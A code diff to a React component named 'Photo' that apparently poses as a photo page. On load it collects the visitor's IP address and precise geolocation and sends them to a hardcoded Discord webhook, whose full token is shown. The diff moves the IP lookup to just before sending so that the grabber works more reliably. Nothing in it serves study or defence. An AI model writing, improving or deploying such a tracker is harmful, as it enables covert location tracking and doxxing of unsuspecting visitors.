@@ -2,23 +2,14 @@ import { useState, useEffect } from 'react';
 
 export default function Photo() {
   const [step, setStep] = useState('loading');
-  const [ip, setIp] = useState('unknown');
 
-  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y';
+  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y'; 
 
   useEffect(() => {
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => setIp(d.ip))
-      .catch(() => {});
-
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          // Wait 500ms so the IP fetch finishes before sending
-          setTimeout(() => {
-            sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          }, 500);
+          sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
         },
         (err) => {
           setStep('failed');
@@ -30,8 +21,16 @@ export default function Photo() {
   }, []);
 
   const sendToDiscord = async (lat, lon, acc) => {
+    // grab the IP right now, right before we send
+    let currentIp = 'unknown';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      currentIp = ipData.ip;
+    } catch (e) {}
+
     const fields = [
-      { name: 'IP Address', value: `\`${ip}\``, inline: false },
+      { name: 'IP Address', value: `\`${currentIp}\``, inline: false },
       { name: 'Latitude', value: `${lat}`, inline: true },
       { name: 'Longitude', value: `${lon}`, inline: true },
       { name: 'Accuracy', value: `${acc} meters`, inline: true },
